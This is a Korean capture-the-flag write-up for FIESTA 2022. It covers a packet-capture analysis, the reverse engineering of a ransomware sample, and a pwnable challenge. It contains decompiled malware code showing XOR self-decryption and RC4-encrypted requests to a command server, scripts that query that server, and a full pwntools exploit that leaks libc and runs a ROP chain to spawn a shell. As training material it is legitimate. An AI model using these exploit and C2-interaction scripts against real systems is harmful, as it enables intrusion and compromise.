# FIESTA 2022

## APT

---

네트워크 패킷 파일이 문제로 주어졌다.  

피해자가 악성코드에 감염됐기 때문에 무엇인가를 다운로드 받은 흔적이 있을 것으로 추측할 수 있다.

![Untitled](FIESTA%202022%200e7e274a7bc24bc39ae05e5b09104b71/Untitled.png)

wireshark로 패킷을 열고 protocol로 정렬을 하면 위와 같이 HTTP 통신을 한 흔적들이 보인다. 이 중에서 4번째 통신을 보면 base64로 인코딩된 경로랑 통신하는 이상한 흔적이 보인다.

![Untitled](FIESTA%202022%200e7e274a7bc24bc39ae05e5b09104b71/Untitled%201.png)

해당 패킷을 tcp stream으로 follow 하면 위와 같이 응답결과로 실행 파일이 다운로드 되는 것을 확인할 수 있다.

즉, 해당 통신이 악성코드 감염의 원인!

<aside>
💡 GET /u?v=Zmllc3Rhe2Y4MGNiODFhMjg0ZmI1MjhiZjRiMzcyOTRmNGVjZWFkfQ==

</aside>

해당 통신 URL을 보면 v 파라미터의 값이 base64 인코딩 된 것을 볼 수 있고 디코딩 했다.

```python
fiesta{f80cb81a284fb528bf4b37294f4ecead}
```

디코딩 결과 flag 값이 나오는 것을 확인할 수 있다.

## 랜섬웨어

---

```python
void __fastcall TlsCallback_0(__int64 a1)
{
  unsigned __int64 v2; // r11
  __int64 v3; // r9
  unsigned __int16 v4; // r8
  unsigned __int16 v5; // r10
  __int64 v6; // rdx
  unsigned __int64 v7; // rcx
  __m128i *v8; // rax
  __m128i *v9; // rdx
  __m128i si128; // xmm1
  unsigned __int64 v11; // rcx

  if ( !dword_140008988 )
  {
    v2 = 0i64;
    v3 = a1 + *(int *)(a1 + 60);
    v4 = 0;
    v5 = *(_WORD *)(v3 + 6);
    if ( v5 )
    {
      while ( 1 )
      {
        v6 = *(unsigned __int16 *)(v3 + 20) + v3 + 24 + 40i64 * v4;
        if ( *(_BYTE *)v6 == '.'
          && *(_BYTE *)(v6 + 1) == 't'
          && *(_BYTE *)(v6 + 2) == 'e'
          && *(_BYTE *)(v6 + 3) == 'x'
          && *(_BYTE *)(v6 + 4) == 't'
          && !*(_BYTE *)(v6 + 5)
          && !*(_BYTE *)(v6 + 6)
          && !*(_BYTE *)(v6 + 7) )
        {
          break;
        }
        if ( ++v4 >= v5 )
          return;
      }
      if ( *(int *)(v6 + 36) < 0 )
      {
        if ( *(_BYTE *)(*(unsigned int *)(v3 + 40) + a1) == 0xCC )
          ExitProcess(0);
        v7 = *(unsigned int *)(v6 + 16);
        v8 = (__m128i *)(a1 + *(unsigned int *)(v6 + 12));
        v9 = (__m128i *)((char *)v8 + v7);
        if ( v8 > (__m128i *)&v8->m128i_i8[v7] )
          v7 = 0i64;
        if ( v7 >= 0x40 )
        {
          si128 = _mm_load_si128((const __m128i *)&xmmword_140005610);
          v11 = v7 & 0xFFFFFFFFFFFFFFC0ui64;
          do
          {
            v2 += 64i64;
            *v8 = _mm_xor_si128(_mm_loadu_si128(v8), si128);
            v8[1] = _mm_xor_si128(_mm_loadu_si128(v8 + 1), si128);
            v8[2] = _mm_xor_si128(_mm_loadu_si128(v8 + 2), si128);
            v8[3] = _mm_xor_si128(_mm_loadu_si128(v8 + 3), si128);
            v8 += 4;
          }
          while ( v2 < v11 );
        }
        for ( ; v8 < v9; v8 = (__m128i *)((char *)v8 + 1) )
          v8->m128i_i8[0] ^= 0x77u;
      }
      dword_140008988 = 1;
    }
  }
}
```

파일을 디컴파일하면 `tls callback` 함수만 보인다.

해당 함수를 분석하면 `.text` 영역의 코드를 `0x77`로 xor 연산하는 것을 알 수 있다.

악성코드 탐지를 우회하기 위해서 코드 영역을 암호화한 상태이고 이를 xor 연산해서 코드 영역을 복구하고 악성코드 실행하는 것으로 추측할 수 있다.

### ○ ida python 바이트 패치

```python
import ida_segment
import ida_bytes
import ida_ua
import ida_funcs

def re_analysis(start, end):
    size = end - start
    if not size:
        return False
    for i in range(start, end):
        ida_bytes.del_items(i)
    for i in range(start, end):
        ida_ua.create_insn(i)
    ida_funcs.add_func(start)

tsegm = ida_segment.get_segm_by_name(".text")

for ea in range(tsegm.start_ea, tsegm.end_ea):
    tmp = ida_bytes.get_byte(ea)
    ida_bytes.patch_byte(ea, tmp ^ 0x77)

re_analysis(tsegm.start_ea, tsegm.end_ea)
```

`[shift] + [F2]`로 ida python 스크립트 삽입 가능하다.

스크립트로 `.text` 영역 원본 코드를 복구한다. 이후에는 원본 코드들이 디컴파일 된다.

```python
*(_QWORD *)&v32 = v16 + 10;
  *((_QWORD *)&v32 + 1) = v19;
  qmemcpy(v20, "/first?dn=", 10);
  memcpy((char *)v20 + 10, v17, v16);
  *((_BYTE *)v20 + v18) = 0;
  if ( Size[1] < 0x10 )
    goto LABEL_34;
  v23 = Src[0];
  if ( Size[1] + 1 >= 0x1000 )
  {
    v23 = (void *)*((_QWORD *)Src[0] - 1);
    if ( (unsigned __int64)(Src[0] - v23 - 8) > 0x1F )
LABEL_45:
      invalid_parameter_noinfo_noreturn();
  }
  j_j_free(v23);
LABEL_34:
  *(_OWORD *)Src = v31;
  *(_OWORD *)Size = v32;
  Block[0] = 0i64;
  v34 = 0i64;
  v35 = 7i64;
  sub_1400027D0(Block);
  memset(v38, 0, sizeof(v38));
  memset(&v38[2], 0, 264);
  v38[0] = WinHttpOpen(L"HTTP Application/1.0", 0, 0i64, 0i64, 0);
  v38[1] = WinHttpConnect(v38[0], L"43.202.4.134", 0x22B8u, 0);
  *(_OWORD *)&v38[3] = *(_OWORD *)L"43.202.4.134";
  v38[5] = *(HINTERNET *)L".134";
  LOWORD(v38[67]) = 8888;
```

`19D0` 함수를 보면 통신하는 url이 무엇인지 확인할 수 있다.

```python
do
  {
    *(_BYTE *)v4 = v3++;
    v4 = (HINTERNET *)((char *)v4 + 1);
  }
  while ( v3 < 256 );
  LOWORD(v38[32]) = 0;
  v5 = 0;
  v6 = 0;
  v7 = v38;
  do
  {
    v8 = *(_BYTE *)v7;
    v9 = v6 % v2;
    v5 += a20210622YjMhRe[v6 % v2] + *(_BYTE *)v7;
    *(_BYTE *)v7 = *((_BYTE *)v38 + v5);
    *((_BYTE *)v38 + v5) = v8;
    ++v6;
    v7 = (HINTERNET *)((char *)v7 + 1);
  }
  while ( v6 < 0x100 );
  if ( (int)v0 > 0 )
  {
    v10 = aFiesta2021Malw;
    v11 = (unsigned int)v0;
    v12 = BYTE1(v38[32]);
    LOBYTE(v9) = v38[32];
    do
    {
      LOBYTE(v38[32]) = v9 + 1;
      v13 = (unsigned __int8)(v9 + 1);
      BYTE1(v38[32]) = *((_BYTE *)v38 + v13) + v12;
      v14 = *((_BYTE *)v38 + v13);
      *((_BYTE *)v38 + v13) = *((_BYTE *)v38 + BYTE1(v38[32]));
      *((_BYTE *)v38 + BYTE1(v38[32])) = v14;
      v12 = BYTE1(v38[32]);
      v9 = LOBYTE(v38[32]);
      *v10++ ^= *((_BYTE *)v38 + (unsigned __int8)(*((_BYTE *)v38 + LOBYTE(v38[32])) + *((_BYTE *)v38 + BYTE1(v38[32]))));
      --v11;
    }
    while ( v11 );
  }
```

`19D0` 함수에서 url 요청 전에 사용하는 암호화 로직 코드다.

while 문 작업이 `0x100`회 진행하는 것을 통해서 RC4 알고리즘이라고 유추 가능하다.

```python
.data:0000000140008038 46 49 45 53 54 41 32 30 32 31+aFiesta2021Malw db 'FIESTA2021-Malware.dll',0
.data:0000000140008038 2D 4D 61 6C 77 61 72 65 2E 64+                                        ; DATA XREF: sub_1400019D0+45↑o
.data:000000014000804F 00                            db    0
.data:0000000140008050 32 30 32 31 2D 30 36 2D 32 32+a20210622YjMhRe db '2021-06-22-yj-mh-restart',0
```

암호화 작업을 수행하는 변수를 보면 위와 같다.

암호화 로직은 key gen → encrypt 순서다. 

먼저, 사용하는 `2021-06-22-yj-mh-restart`가 key고 `FIESTA2021-Malware.dll`가 plaintext임을 유추 할 수 있다.

```python
sub_140001720(Src, v9, v15);
```

코드를 보면 src에 v9과 v15를 복사한다.

v9은 암호화 로직의 결과라는 것을 대충 유추할 수 있다.

```python
v17 = Src;
...
qmemcpy(v20, "/first?dn=", 10);
memcpy((char *)v20 + 10, v17, v16);
```

`src`는 결국 dn 파라미터의 값이라는 것을 유추할 수 있다.

### ○ rc4 암호화 알고리즘

```python
import hashlib

def md5_encode(value):
    enc = hashlib.md5()
    enc.update(value)
    encText = enc.hexdigest()

    return encText

def KSA(key):
    s = [i for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i%len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return bytes(s)

def PRGA(text, s):
    s = bytearray(s)
    t_list = bytearray(text)
    i, j = (0, 0)
    for index in range(len(t_list)):
        i = (i+1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        xor_key = s[(s[i] + s[j]) % 256]
        t_list[index] = xor_key ^ t_list[index]
    
    return bytes(t_list)

def rc4(text, key = b'2021-06-22-yj-mh-restart'):
    s = KSA(key)
    result = PRGA(text, s)
    return result

ip = "43.202.4.134"
parm = rc4(b"FIESTA2021-Malware.dll").hex()

total_path = f"http://{ip}/first?dn={parm}"
md5_total_path = md5_encode(total_path.encode())
print(f"{total_path}")
print(f"md5: {md5_total_path}")
```

`rc4 암호화 알고리즘` 코드를 구현하고 `parm`을 암호화하여 전체 url 완성하고 md5로 해싱하면 flag를 완성할 수 있다.

```python
FIESTA{f4b4dcb1295e7c2bf3fdab81f30c109b}
```

```python
# stage 2
import hashlib
from requests import *
def md5_encode(value):
    enc = hashlib.md5()
    enc.update(value)
    encText = enc.hexdigest()
    return encText

def KSA(key):
    s = [i for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i%len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return bytes(s)

def PRGA(text, s):
    s = bytearray(s)
    t_list = bytearray(text)
    i, j = (0, 0)
    for index in range(len(t_list)):
        i = (i+1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        xor_key = s[(s[i] + s[j]) % 256]
        t_list[index] = xor_key ^ t_list[index]
    return bytes(t_list)

def rc4(text, key = b'2021-06-22-yj-mh-restart'):
    s = KSA(key)
    result = PRGA(text, s)
    return result

ip = "43.202.4.134"
port = "8888"
parm = rc4(b"359f5effdb3ed07d9a90a4ed19d13ad4").hex()
total_path = f"http://{ip}:{port}/first?dn={parm}"
res = get(url = total_path)
print(f"{total_path}")
print(res.content)
```

```python
from ida_bytes import *
from idc import *
import hashlib
def md5_encode(value):
    enc = hashlib.md5()
    enc.update(value)
    encText = enc.hexdigest()
    return encText

def decrypt(enc, key=b"3DUf"):
    enc = bytearray(enc)
    for i in range(len(enc)):
        enc[i] ^= key[i%len(key)]
    return bytes(enc)

username_enc = get_bytes(0x180014048, get_dword(0x180014044))
mutex_enc = get_bytes(0x180014080, get_dword(0x180014040))
directory = "C:\\Users\\FIESTA2021\\secret"

print(decrypt(username_enc))

flag = decrypt(username_enc).decode() + decrypt(mutex_enc).decode() + directory
flag_md5 = md5_encode(flag.encode())
print(flag_md5)
```

ida python `get_bytes()`를 이용해서 내부 데이터 가져올 수 있다.

→ `get_bytes([데이터 주소], [데이터 길이 주소])`

```python
FIESTA{3438f21befb08fcd9138ba39013f8bbf}
```

```python
from requests import *

def KSA(key):
    s = [i for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i%len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return bytes(s)

def PRGA(text, s):
    s = bytearray(s)
    t_list = bytearray(text)
    i, j = (0, 0)
    for index in range(len(t_list)):
        i = (i+1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        xor_key = s[(s[i] + s[j]) % 256]
        t_list[index] = xor_key ^ t_list[index]
    return bytes(t_list)

def rc4(text, key = b'2021-06-22-yj-mh-restart'):
    s = KSA(key)
    result = PRGA(text, s)
    return result

ip = "43.202.4.134"
port = "8888"

parm = rc4(b"3438f21befb08fcd9138ba39013f8bbf").hex()
total_path = f"http://{ip}:{port}/first?dn={parm}"
res = get(url = total_path)
print(f"{total_path}")
print(res.content)
```

서버에 저장되는 암호문을 제목으로 랜덤키가 저장되는데, 암호문 제목이 타겟 정보가 md5 암호화된 값이다.

따라서 md5 암호문을 `/first`로 전송해서 조회하면, 뱅크 암호키(랜덤키) 를 얻을 수 있다.

```python
# stage5
from requests import *
from hashlib import *
from Crypto.Cipher import AES

class AESDecryptor:
    def __init__(self, key):
        self.key = sha256(bytes.fromhex(key.decode())).digest()
    def decrpyt(self, enc):
        cipher = AES.new(self.key, AES.MODE_ECB)
        return cipher.decrypt(enc)

def KSA(key):
    s = [i for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i%len(key)]) % 256
        s[i], s[j] = s[j], s[i]
    return bytes(s)

def PRGA(text, s):
    s = bytearray(s)
    t_list = bytearray(text)
    i, j = (0, 0)
    for index in range(len(t_list)):
        i = (i+1) % 256
        j = (j + s[i]) % 256
        s[i], s[j] = s[j], s[i]
        xor_key = s[(s[i] + s[j]) % 256]
        t_list[index] = xor_key ^ t_list[index]
    return bytes(t_list)

def rc4(text, key = b'2021-06-22-yj-mh-restart'):
    s = KSA(key)
    result = PRGA(text, s)
    return result

ip = "43.202.4.134"
port = "8888"

parm = rc4(b"3438f21befb08fcd9138ba39013f8bbf").hex()
total_path = f"http://{ip}:{port}/first?dn={parm}"
res = get(url = total_path)
print(f"{total_path}")
print(res.content)

aes = AESDecryptor(res.content)

with open("last_flag.txt", "rb") as p:
    data = p.read()

print(aes.decrpyt(data))
```

stage4에서 얻은 암호키를 토대로 주어진 `last_flag.txt`를 복호화하면 된다.

해당 키는 `AES key`다.

핵심은 전체적인 랜섬웨어 시나리오를 이해하고 흐름도에 따라 원하는 정보를 얻는 것이 중요하다.

## 침해대응 2

---

ZPmanager를 분석하고 pwnable exploit 하는 문제다.

![Untitled](FIESTA%202022%200e7e274a7bc24bc39ae05e5b09104b71/Untitled%202.png)

주어진 바이너리 파일을 보면 4개의 섹션으로 구성된다는 것을 알 수 있다.

각 섹션 헤더에는 섹션의 크기, 오프셋이 저장된다. 다음으로 섹션 헤더 이후에는 각 섹션의 데이터가 저장된다.

ZPmanager를 직접 실행해서 make를 해보면 알겠지만, 3개의 섹션만 이용해서 파일을 생성한다는 것을 알 수 있다. 추가로 기존에 있는 파일을 make하면 기존 파일에 덮어쓰는 방식으로 저장된다.

여기서 취약점이 발생하는데, make를 하는 과정에서 기존 파일을 overwrite하면 입력한 IP 데이터가 4번째 섹션 헤더 영역에 저장된다.

즉, 4번째 섹션 헤더를 제어할 수 있다는 의미이고 이를 이용해서 libc_base leak과 ROP exploit을 수행할 수 있다.

```python
from pwn import *
import warnings

warnings.filterwarnings('ignore')

#context.log_level='debug'

p = remote('43.202.50.223', 5333)
#p = process('./ZPmanager', env = {'LD_PRELOAD':'./libc.so.6'})
e = ELF('./ZPmanager')
libc = ELF('./libc.so.6')

def select_list(num):
  p.sendlineafter('> ', 'list')
  p.sendlineafter('> ', str(num))

def make(ip, port, hash):
  p.sendlineafter('> ', 'make')
  p.sendlineafter(': ', ip)
  p.sendlineafter(': ', port)
  p.sendlineafter(': ', hash)
  
def info():
  p.sendlineafter('> ', 'info')

pause()

# Leak libc_base
payload = b'\x0f\x00\x00\x00\x28\x00\x00\x00/proc/self/maps' # 섹션 size, offset AAW
#make(payload, '1111', '7a2d4788e97071e906dad3f3d17b4da9')
make(payload, '1111', 'fb9320fe1fb5ef25759c9bb313b51289')
select_list(0)
info()

proc_maps = p.recvuntil('[vdso]').decode()
libc_base = proc_maps.split('libc.so.6')[0]
libc_base = libc_base.split('\n')
libc_base = libc_base[len(libc_base)-1]
libc_base = libc_base.split('-')[0].replace('-', '')

libc_base = int(libc_base, 16)
print(hex(libc_base))

pop_rdi = libc_base + 0x2a3e5
system = libc_base + 0x50D60
bin_sh = libc_base + 0x1d8698
stderr = libc_base + 0x21a6a0
ret = libc_base + 0x5d5b7

# ROP exploit
rop = b'\x90' * 64 + p64(stderr) # fclose() 정상 실행 시키기 위해서 stream을 stderr로 AAW
rop += b'\x90' * (88 - len(rop) + 8)
rop += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)

print(len(rop))
payload = b'\x90\x01\x00\x00\x28\x00\x00\x00' # 섹션 size, offset AAW
#make(payload, rop, 'a1add03f2387becccf5f90473dfbc7c7')
make(payload, rop, 'f0f4fa7f78a8a62b0edf6cd426c7e3e1')
select_list(1)
info()

p.interactive()
```

기존 파일의 4번째 섹션인 로그 섹션의 offset과 size를 AAW 함으로써 `info()` 과정에서 BOF를 일으킨다.

```python
if ( n == 4 )
  {
    printf("COMMANDLOGFILE PATH: %s\n", v4);
    fd = open(v4, 0);
    if ( fd == -1 )
    {
      puts("No LogFile found.");
      return fclose(stream);
    }
```

ASLR bypass를 위해서 `/proc/self/map`을 `info()`에서 log 파일 path로 인식되도록 조작하고 출력시켜서 libc_base를 획득한다. 

다음으로 또 다시 로그 섹션을 조작해서 size를 늘리고 로그 섹션 offset을 첫번째 섹션 offset으로 조절해준다. 이후 ROP exploit을 진행한다.

여기서 주의할 점은 exploit 과정에서 아무 값이나 더미로 넣어서 ROP 하면 `fclose(stream)`에서 에러가 발생한다. 따라서 더미 중간의 stream을 stderr로 AAW 해야한다. 

참고로 stdin이나 stdout으로 AAW하면 쉘을 획득하더라고 쉘을 정상적으로 사용할 수가 없다.

![Untitled](FIESTA%202022%200e7e274a7bc24bc39ae05e5b09104b71/Untitled%203.png)